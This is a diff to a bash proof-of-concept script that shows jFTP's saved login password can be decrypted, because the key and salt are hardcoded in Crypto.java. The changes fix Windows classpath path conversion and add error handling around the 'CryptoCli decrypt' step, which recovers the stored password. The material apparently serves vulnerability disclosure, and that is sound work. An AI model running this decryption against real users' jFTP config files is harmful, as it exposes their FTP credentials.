@@ -37,14 +37,38 @@ if [[ ! -f "${JFTP_SRC}/src/java/net/sf/jftp/config/Crypto.java" ]]; then
     exit 1
 fi
 
-# The Java launcher wants ';' between classpath entries on Windows (even
-# under Git Bash/MSYS, since it's the native java.exe doing the parsing)
-# and ':' everywhere else.
+# On Windows (Git Bash/MSYS/Cygwin), `java`/`javac` are native Win32
+# binaries, not MSYS binaries -- they need native "C:\..." paths, not
+# POSIX "/c/..." paths. Git Bash normally auto-translates a POSIX path to
+# a Windows path for you when an argument IS a path, but -cp here is TWO
+# paths joined by ';' inside one argument -- that joined string no longer
+# "looks like a path" to the auto-translator, so it's passed through
+# unconverted and java.exe can't resolve either half, silently failing to
+# find CryptoCli (so decrypt/encrypt calls below produce nothing useful).
+# cygpath -w, which ships with Git Bash, converts a path explicitly; use
+# it per-component before joining, and fall back to the path unchanged
+# everywhere else (where it's already native).
+to_native_path() {
+    if command -v cygpath >/dev/null 2>&1; then
+        cygpath -w "$1"
+    else
+        printf '%s' "$1"
+    fi
+}
+
 case "$(uname -s)" in
-    CYGWIN*|MINGW*|MSYS*) CP_SEP=';' ;;
-    *) CP_SEP=':' ;;
+    CYGWIN*|MINGW*|MSYS*)
+        CP_SEP=';'
+        CRYPTO_OUT_DIR="$(to_native_path "${DEMO_DIR}/crypto_helper/out")"
+        JFTP_LIB_DIR="$(to_native_path "${JFTP_SRC}/lib")"
+        ;;
+    *)
+        CP_SEP=':'
+        CRYPTO_OUT_DIR="${DEMO_DIR}/crypto_helper/out"
+        JFTP_LIB_DIR="${JFTP_SRC}/lib"
+        ;;
 esac
-CRYPTO_CP="${DEMO_DIR}/crypto_helper/out${CP_SEP}${JFTP_SRC}/lib"
+CRYPTO_CP="${CRYPTO_OUT_DIR}${CP_SEP}${JFTP_LIB_DIR}"
 
 # Where jFTP actually writes .login_default: Settings.login_def is
 # ${user.home}/.jftp/.login_default. Override LOGIN_DEFAULT directly if
@@ -109,7 +133,26 @@ echo "and salt that are hardcoded constants in Crypto.java -- identical on"
 echo "every install, and visible to anyone with the jFTP source or jar. The"
 echo "attacker recompiles/reuses that exact class to decrypt:"
 
-RECOVERED_PW=$(java -cp "${CRYPTO_CP}" CryptoCli decrypt "${LD_ENC_PW}")
+if [[ ! -f "${DEMO_DIR}/crypto_helper/out/CryptoCli.class" ]]; then
+    echo "FAILED: ${DEMO_DIR}/crypto_helper/out/CryptoCli.class not found." >&2
+    echo "Run ./setup.sh first to compile it." >&2
+    exit 1
+fi
+
+if ! JAVA_OUT=$(java -cp "${CRYPTO_CP}" CryptoCli decrypt "${LD_ENC_PW}" 2>&1); then
+    echo "FAILED: the 'java' command itself errored out:" >&2
+    echo "${JAVA_OUT}" >&2
+    echo >&2
+    echo "classpath used: ${CRYPTO_CP}" >&2
+    echo "This usually means one of the two paths in that classpath is wrong" >&2
+    echo "for how 'java' expects to see it on this OS -- e.g. on Windows," >&2
+    echo "if a POSIX-style /c/... path got passed to the native Windows" >&2
+    echo "java.exe instead of a C:\\... path, java.exe can't find CryptoCli" >&2
+    echo "on that classpath at all. Verify both halves of the path above" >&2
+    echo "actually exist from java's point of view." >&2
+    exit 1
+fi
+RECOVERED_PW="${JAVA_OUT}"
 
 if [[ -z "${RECOVERED_PW}" ]]; then
     echo "FAILED: Crypto.Decrypt() returned an empty string." >&2
